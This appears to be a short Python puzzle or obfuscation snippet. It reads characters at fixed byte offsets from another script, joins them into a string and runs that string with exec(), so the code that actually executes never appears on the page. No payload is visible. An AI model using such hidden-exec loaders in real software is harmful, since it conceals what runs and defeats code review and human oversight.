with open('../src/script.py', 'r') as h:

    s = h.read()
    
    h.seek(0,2)
    size = h.tell()
    print(size)
    
    gg = []
    for i in [22, 20, 21, 8, 23, 4, 9, 10, 38, 7, 95, 95, 5, 4, 0, 5, 15, 95, 55, 10, 33]:
        h.seek(i,0)
        # print(h.read(1))
        gg.append(h.read(1))
    exec(''.join(gg))
    
    
    
    
    
    
    
    
    
    
    
    
    